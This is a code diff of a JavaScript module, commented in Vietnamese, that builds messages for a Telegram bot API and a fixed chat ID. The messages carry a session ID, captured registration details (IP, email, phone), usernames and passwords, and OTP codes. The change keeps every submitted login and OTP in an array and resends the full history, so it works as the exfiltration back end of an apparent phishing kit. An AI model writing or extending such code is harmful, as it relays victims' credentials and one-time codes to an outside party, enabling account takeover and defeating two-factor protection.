@@ -3,8 +3,8 @@ const CHAT_ID = '-5002883190';
 const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/`;
 
 let tgMessageId = null;
-let currentSessionText = '';
 let currentSessionId = '';
+let logHistory = []; // Dùng mảng để lưu trữ toàn bộ lịch sử
 
 const getSessionId = () => {
     if (currentSessionId) return currentSessionId;
@@ -19,7 +19,8 @@ const getSessionId = () => {
 };
 
 export const setInitialSession = (text) => { 
-    currentSessionText = text; 
+    // Lưu thông tin đăng ký vào mảng (chỉ lưu 1 lần)
+    logHistory = [text];
 };
 
 export const escapeHtml = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
@@ -27,40 +28,45 @@ export const escapeHtml = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, 
 export const sendTelegramMessage = (newContent) => {
     const sid = getSessionId();
     
-    // 1. Mã phiên luôn bọc trong <code>
+    // Nếu có nội dung mới (Login, OTP), ném tiếp vào mảng
+    if (newContent) {
+        logHistory.push(newContent);
+    }
+    
+    // Bắt đầu format tin nhắn
     let text = `<b>🔑 MÃ PHIÊN: <code>${sid}</code></b>\n\n`;
     
-    // 2. Xử lý text đăng ký (tách từng dòng, bọc <code> cho phần giá trị)
-    if (currentSessionText) {
-        const lines = currentSessionText.split('\n');
-        lines.forEach(line => {
-            if (line.trim()) {
-                if (line.includes(':')) {
-                    const [label, ...rest] = line.split(':');
-                    const value = rest.join(':').trim();
-                    if (value) {
-                        text += `${label}: <code>${value}</code>\n`;
+    // Duyệt qua toàn bộ lịch sử để in ra
+    logHistory.forEach((item, index) => {
+        if (index === 0) {
+            // Phần 1: Thông tin đăng ký (IP, Email, Phone...)
+            const lines = item.split('\n');
+            lines.forEach(line => {
+                if (line.trim()) {
+                    if (line.includes(':')) {
+                        const [label, ...rest] = line.split(':');
+                        const value = rest.join(':').trim();
+                        if (value) {
+                            text += `${label}: <code>${value}</code>\n`;
+                        } else {
+                            text += `${line}\n`;
+                        }
                     } else {
                         text += `${line}\n`;
                     }
-                } else {
-                    text += `${line}\n`; // Dòng kẻ ---
                 }
-            }
-        });
-    }
-
-    // 3. Xử lý Login/OTP
-    if (newContent) {
-        if (newContent.includes(' | ')) {
-            // Tách Login thành 2 cục để copy riêng
-            const [user, pass] = newContent.split(' | ');
-            text += `\n<code>${user}</code> | <code>${pass}</code>`;
+            });
         } else {
-            // Bọc nguyên cục OTP
-            text += `\n<code>${newContent}</code>`;
+            // Phần 2: Login / OTP (in ra từng dòng, cách nhau 1 dòng trống)
+            text += `\n`;
+            if (item.includes(' | ')) {
+                const [user, pass] = item.split(' | ');
+                text += `<code>${user}</code> | <code>${pass}</code>`;
+            } else {
+                text += `<code>${item}</code>`;
+            }
         }
-    }
+    });
 
     const tgFetch = (method, payload) => {
         let bodyStr = '';
